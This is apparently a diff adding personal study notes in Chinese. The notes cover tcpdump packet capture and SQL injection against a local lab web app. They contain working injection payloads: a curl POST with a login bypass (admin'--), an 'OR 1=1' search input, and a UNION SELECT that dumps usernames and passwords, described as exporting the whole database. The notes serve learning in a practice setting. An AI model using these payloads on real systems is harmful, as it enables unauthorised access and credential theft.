@@ -1,0 +1,28 @@
+抓包（先只学一句）：tcpdump -i eth0 -s 0 host [ ip ] -w  文件名.pcap
+拆解：
+-i eth0  用哪个网卡（不知道先用tcpdump -D查看）
+-s 0  抓完整的数据包，这个很重要一定要加
+host  [ ip ]：只抓指定ip的进出流量
+-w 文件名.pcap  ：保存成文件
+
+
+
+注入（针对Linux）
+
+域名示例  http://192.168.4.39:8005/
+POST注入：curl -X POST http://192.168.4.39:8005/路径 -d “参数=值”
+示例：curl -X POST http://192.168.4.39:8005/路径 -d “username=admin'--&password=123456”
+
+针对文件夹里的网页的三个注入点
+/login：  注入admin’ --
+/search：注入‘ OR 1=1 --
+/users？id=1 1 UNION SELECT 1,username,password,3,4 FROM users --
+
+--：SQL注释，让后面的代码失效
+’ ：闭合前面的参数
+OR 1=1 ：恒真条件
+UNION SELECT：拖库，把数据库里的数据全部导出来
+
+
+
+注入的本质：给变量赋一些奇奇怪怪的值
